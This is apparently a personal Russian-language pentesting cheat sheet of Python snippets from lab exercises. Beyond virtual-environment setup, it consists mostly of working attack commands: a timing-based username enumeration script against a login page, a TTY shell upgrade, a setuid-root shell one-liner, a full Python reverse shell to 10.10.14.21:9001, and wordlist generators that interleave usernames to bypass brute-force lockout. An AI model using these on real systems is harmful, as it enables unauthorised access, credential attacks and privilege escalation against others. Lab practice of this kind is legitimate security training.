# Python

# Активировать виртуальную среду


python3 -m venv myvenv

source myvenv/bin/activate

pip3 install -r requirements.txt

pip3 install .

deactivate    (выход и окружения)

# Интерактивный режим

    python3 -i script.py

    import requests
    import sys

    # URL формы регистрации
    url = "http://10.10.11.135/login.php?login=true"
    data = {"user":sys.argv[1],"password":"dvdsvdsvdsvsdvs"}
    # Отправка POST-запроса
    response = requests.post(url, data=data)
    print(response.elapsed.microseconds)

![Uploading image.png…]()


# получение виртуальной оболочки внутри текущей сессии линукс

    python3 -c 'import pty;pty.spawn("/bin/bash")'

    export TERM=xterm

# выполнение команд оси

./python3.8 -c “import os; os.setuid(0), os.system(‘/bin/sh’)”

# Reverse shell

    exec python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.21",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
# Разное
for i in range(150):
        if i % 3:
                print("carlos")
        else:
                print("wiener")


print("**************************************************************")
'''
with open('pass.txt', 'r') as f:
        lines = f.readlines()
i=0

for pwd in lines:
    if i % 3:
        print(pwd.strip('\n'))
    else:
        print("peter")
        print(pwd.strip('\n'))
        i = i+1
    i = i + 1
